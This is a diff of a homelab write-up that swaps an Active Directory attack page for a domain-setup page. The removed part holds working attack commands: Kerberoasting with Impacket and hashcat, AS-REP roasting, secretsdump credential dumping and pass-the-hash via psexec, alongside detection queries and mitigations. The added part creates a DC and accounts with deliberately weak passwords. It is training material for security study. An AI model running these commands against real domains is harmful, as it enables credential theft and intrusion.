@@ -1,201 +1,185 @@
-# Project 02 — Active Directory Lab
+# Project 02 — Active Directory Domain Setup
 
-**Skills:** Active Directory, Windows Server, Kerberoasting, Pass-the-Hash, BloodHound, Privilege Escalation
+**Skills:** Windows Server, Active Directory Domain Services, DNS, PowerShell, Organisational Units
 
 ---
 
 ## Objective
 
-Deploy a realistic Active Directory environment, populate it with simulated users and groups, then execute common AD attack techniques from the Kali Linux attacker machine — mirroring techniques used in real-world red team engagements.
+Create the Windows Server VM that will become the domain controller, promote it to a DC for the `corp.lab` domain, and populate Active Directory with realistic Organisational Units, users, and service accounts — forming the enterprise environment that all subsequent exercises target.
 
 ---
 
 ## Environment
 
-| VM | Role | IP |
-|----|------|----|
-| winserver2019 | Domain Controller (lab.local) | 10.20.20.10 |
-| win10-client1 | Domain workstation (user: jsmith) | 10.20.20.20 |
-| win10-client2 | Domain workstation (user: bwilson) | 10.20.20.21 |
-| kali | Attacker | 10.10.10.10 |
+| VM | Hostname | Role | IP |
+|----|----------|------|----|
+| Windows Server VM | DC01 | Domain Controller | 192.168.0.10 (static) |
+
+**Domain:** `corp.lab` | **NetBIOS:** `CORP`
 
 ---
 
-## Part 1 — Active Directory Setup
+## Steps Completed
 
-### 1.1 Promote Windows Server to Domain Controller
+### 1. Created the Windows Server VM in VirtualBox
+
+- Downloaded the Windows Server evaluation ISO from [Microsoft Evaluation Center](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022)
+- Created a new VM in VirtualBox:
+  - Type: **Microsoft Windows**, Version: **Windows 2019 (64-bit)**
+  - RAM: 4 GB | CPU: 2 | Disk: 60 GB (dynamically allocated)
+  - Network adapter: **Bridged Adapter** (same home LAN as Kali)
+- Installed Windows Server **without a product key** (evaluation mode)
+- Selected **Desktop Experience** to get a full GUI
+
+### 2. Renamed the Server to DC01
+
+After Windows installed and the first login was complete:
 
 ```powershell
-# Install AD DS role
+Rename-Computer -NewName "DC01" -Restart
+```
+
+### 3. Configured a Static IP
+
+After reboot, set a static IP so DNS remains stable when the system becomes a DC:
+
+```powershell
+# Run as Administrator
+New-NetIPAddress `
+  -InterfaceAlias "Ethernet" `
+  -IPAddress 192.168.0.10 `
+  -PrefixLength 24 `
+  -DefaultGateway 192.168.0.1
+
+# Point DNS to itself (required before DC promotion)
+Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 127.0.0.1
+```
+
+Verified the static IP was applied:
+
+```powershell
+ipconfig /all
+```
+
+### 4. Rebooted the Server
+
+```powershell
+Restart-Computer
+```
+
+### 5. Installed Active Directory Domain Services
+
+After logging back in as local Administrator:
+
+```powershell
 Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
+```
 
-# Promote to DC — creates new forest lab.local
+### 6. Promoted the Server to Domain Controller
+
+Created a new forest with the domain name `corp.lab`:
+
+```powershell
 Install-ADDSForest `
-  -DomainName "lab.local" `
-  -DomainNetbiosName "LAB" `
+  -DomainName "corp.lab" `
+  -DomainNetbiosName "CORP" `
   -InstallDns `
-  -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force)
+  -Force
 ```
 
-### 1.2 Create Users and Groups
+The server rebooted automatically. After reboot, logged in as `CORP\Administrator`.
+
+### 7. Created Organisational Units
 
 ```powershell
-# Create OUs
-New-ADOrganizationalUnit -Name "IT" -Path "DC=lab,DC=local"
-New-ADOrganizationalUnit -Name "Finance" -Path "DC=lab,DC=local"
-New-ADOrganizationalUnit -Name "ServiceAccounts" -Path "DC=lab,DC=local"
-
-# Create regular users
-New-ADUser -Name "John Smith" -SamAccountName jsmith -UserPrincipalName jsmith@lab.local `
-  -Path "OU=IT,DC=lab,DC=local" -AccountPassword (ConvertTo-SecureString "Welcome1!" -AsPlainText -Force) `
-  -Enabled $true
-
-New-ADUser -Name "Bob Wilson" -SamAccountName bwilson -UserPrincipalName bwilson@lab.local `
-  -Path "OU=Finance,DC=lab,DC=local" -AccountPassword (ConvertTo-SecureString "Summer2024!" -AsPlainText -Force) `
-  -Enabled $true
-
-# Create a service account with an SPN (for Kerberoasting)
-New-ADUser -Name "svc-sql" -SamAccountName svc-sql -Path "OU=ServiceAccounts,DC=lab,DC=local" `
-  -AccountPassword (ConvertTo-SecureString "Sqlservice1!" -AsPlainText -Force) -Enabled $true
-Set-ADUser -Identity svc-sql -ServicePrincipalNames @{Add="MSSQLSvc/winserver2019.lab.local:1433"}
-
-# Intentionally misconfigure — add jsmith to local admins on win10-client2
-# (simulates lateral movement opportunity)
+New-ADOrganizationalUnit -Name "Corp Users"     -Path "DC=corp,DC=lab"
+New-ADOrganizationalUnit -Name "Corp Admins"    -Path "DC=corp,DC=lab"
+New-ADOrganizationalUnit -Name "Service Accounts" -Path "DC=corp,DC=lab"
+New-ADOrganizationalUnit -Name "Workstations"   -Path "DC=corp,DC=lab"
 ```
 
-### 1.3 Join Clients to Domain
-
-On each Windows 10 VM:
+### 8. Created Domain Users
 
 ```powershell
-Add-Computer -DomainName "lab.local" -Credential (Get-Credential) -Restart
+# Standard domain users
+New-ADUser -Name "John Smith"   -SamAccountName "jsmith" `
+  -UserPrincipalName "jsmith@corp.lab" `
+  -Path "OU=Corp Users,DC=corp,DC=lab" `
+  -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) `
+  -Enabled $true
+
+New-ADUser -Name "Mike Brown"   -SamAccountName "mbrown" `
+  -UserPrincipalName "mbrown@corp.lab" `
+  -Path "OU=Corp Users,DC=corp,DC=lab" `
+  -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) `
+  -Enabled $true
+
+New-ADUser -Name "Sarah Jones"  -SamAccountName "sjones" `
+  -UserPrincipalName "sjones@corp.lab" `
+  -Path "OU=Corp Users,DC=corp,DC=lab" `
+  -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) `
+  -Enabled $true
+
+# Privileged admin account
+New-ADUser -Name "AD Admin"     -SamAccountName "aadmin" `
+  -UserPrincipalName "aadmin@corp.lab" `
+  -Path "OU=Corp Admins,DC=corp,DC=lab" `
+  -AccountPassword (ConvertTo-SecureString "Admin@1234!" -AsPlainText -Force) `
+  -Enabled $true
+
+Add-ADGroupMember -Identity "Domain Admins" -Members "aadmin"
+```
+
+### 9. Created Service Accounts
+
+```powershell
+# SQL service account (used as a Kerberoasting target in later labs)
+New-ADUser -Name "svc-sql" -SamAccountName "svc-sql" `
+  -UserPrincipalName "svc-sql@corp.lab" `
+  -Path "OU=Service Accounts,DC=corp,DC=lab" `
+  -AccountPassword (ConvertTo-SecureString "Sqlservice1!" -AsPlainText -Force) `
+  -Enabled $true
+
+# HTTP service account
+New-ADUser -Name "svc-http" -SamAccountName "svc-http" `
+  -UserPrincipalName "svc-http@corp.lab" `
+  -Path "OU=Service Accounts,DC=corp,DC=lab" `
+  -AccountPassword (ConvertTo-SecureString "Httpservice1!" -AsPlainText -Force) `
+  -Enabled $true
+```
+
+### 10. Verified Domain Health
+
+```powershell
+# Check domain services and replication health
+dcdiag /test:services /test:replications /q
+
+# Confirm users were created
+Get-ADUser -Filter * | Select-Object Name, SamAccountName, Enabled | Format-Table
 ```
 
 ---
 
-## Part 2 — Enumeration from Kali
+## Challenges & Solutions
 
-### 2.1 Network Reconnaissance
-
-```bash
-# Identify live hosts on corporate VLAN
-nmap -sn 10.20.20.0/24
-
-# Port scan the DC
-nmap -sV -sC -p 88,135,139,389,445,464,636,3268,3269 10.20.20.10
-```
-
-### 2.2 SMB Enumeration
-
-```bash
-# Enumerate shares
-smbclient -L //10.20.20.10 -N
-enum4linux -a 10.20.20.10
-
-# Enumerate users via RPC
-rpcclient -U "" -N 10.20.20.10
-rpcclient> enumdomusers
-```
-
-### 2.3 LDAP Enumeration
-
-```bash
-ldapsearch -x -H ldap://10.20.20.10 -b "DC=lab,DC=local" -D "" -w "" \
-  "(objectClass=person)" sAMAccountName userPrincipalName memberOf
-```
-
----
-
-## Part 3 — Active Directory Attacks
-
-### 3.1 Kerberoasting
-
-Kerberoasting extracts Kerberos TGS tickets for service accounts, which can be cracked offline without sending any traffic to the target.
-
-```bash
-# Using Impacket's GetUserSPNs
-python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
-  lab.local/jsmith:Welcome1! -dc-ip 10.20.20.10 -request -outputfile kerberoast_hashes.txt
-
-# Crack the TGS ticket offline
-hashcat -m 13100 -a 0 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
-```
-
-**Result:** Successfully cracked `svc-sql` password: `Sqlservice1!`
-
-### 3.2 AS-REP Roasting
-
-Targets accounts with "Do not require Kerberos preauthentication" enabled.
-
-```bash
-python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py \
-  lab.local/ -usersfile users.txt -dc-ip 10.20.20.10 -no-pass -format hashcat
-```
-
-### 3.3 Pass-the-Hash
-
-After obtaining an NTLM hash from a credential dump, authenticate as that user without knowing the plaintext password.
-
-```bash
-# Dump hashes using secretsdump (requires admin on target)
-python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
-  lab.local/administrator:P@ssw0rd123!@10.20.20.20
-
-# Pass-the-Hash with psexec
-python3 /usr/share/doc/python3-impacket/examples/psexec.py \
-  -hashes :aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> \
-  administrator@10.20.20.21
-```
-
-### 3.4 BloodHound Attack Path Analysis
-
-```bash
-# On win10-client1 (domain-joined), run SharpHound collector
-.\SharpHound.exe -c All --zipfilename bloodhound_data.zip
-
-# Import zip into BloodHound on Kali
-# Queries run:
-# - "Find Shortest Paths to Domain Admins"
-# - "Find Principals with DCSync Rights"
-# - "List all Kerberoastable Accounts"
-```
-
-**Finding:** `jsmith` → `IT Admins` group → `Domain Admins` via nested group membership. This represents a privilege escalation path.
-
----
-
-## Part 4 — Detection
-
-After each attack, reviewed logs in Splunk and Security Onion:
-
-| Attack | Windows Event ID | SPL Query |
-|--------|-----------------|-----------|
-| Kerberoasting | 4769 (TGS request, encryption 0x17) | `index=windows EventCode=4769 TicketEncryptionType=0x17` |
-| AS-REP Roasting | 4768 (TGS request, PreAuth not required) | `index=windows EventCode=4768 PreAuthType=0` |
-| Pass-the-Hash | 4624 (Logon Type 3, NTLM auth) | `index=windows EventCode=4624 LogonType=3 AuthenticationPackageName=NTLM` |
-| BloodHound collection | 4662 (Object access on AD) | `index=windows EventCode=4662` |
-
----
-
-## Mitigations Identified
-
-| Attack | Mitigation |
-|--------|-----------|
-| Kerberoasting | Use strong, random passwords (25+ chars) for service accounts; use Group Managed Service Accounts (gMSAs) |
-| AS-REP Roasting | Require Kerberos preauthentication on all accounts |
-| Pass-the-Hash | Enable Protected Users security group; disable NTLM where possible; use Credential Guard |
-| Lateral Movement | Implement tiered admin model; restrict local admin rights; use LAPS |
+| Challenge | Solution |
+|-----------|----------|
+| Windows Server didn't see the correct NIC alias for the `New-NetIPAddress` command | Ran `Get-NetAdapter` first to confirm the interface alias name (was `Ethernet0` not `Ethernet`) |
+| DC promotion failed — DNS prerequisite check warning | Set DNS server address to `127.0.0.1` before running `Install-ADDSForest`, then promotion succeeded |
+| Users not appearing in correct OUs after creation | Confirmed OU paths with `Get-ADOrganizationalUnit -Filter *` before running `New-ADUser` |
 
 ---
 
 ## Key Takeaways
 
-- Active Directory misconfigurations (weak service account passwords, overprivileged accounts) are consistently exploited in real engagements
-- BloodHound revealed a privilege escalation path that would not have been obvious through manual enumeration
-- All attacks generated detectable Windows events — the key is having a SIEM configured to alert on them
+- Assigning a static IP and pointing DNS to itself before DC promotion avoids common deployment failures
+- Organisational Units (OUs) provide a realistic structure for applying Group Policy and scoping permissions in later exercises
+- Creating multiple user types (standard users, privileged admins, service accounts) mirrors a real enterprise and enables a broader set of attack simulations
 
 ---
 
 ## Next Steps
 
-→ [Project 03 — Network Scanning & Enumeration](03-network-scanning-enumeration.md)
+→ [Project 03 — Active Directory Misconfigurations](03-ad-misconfigurations.md)
+
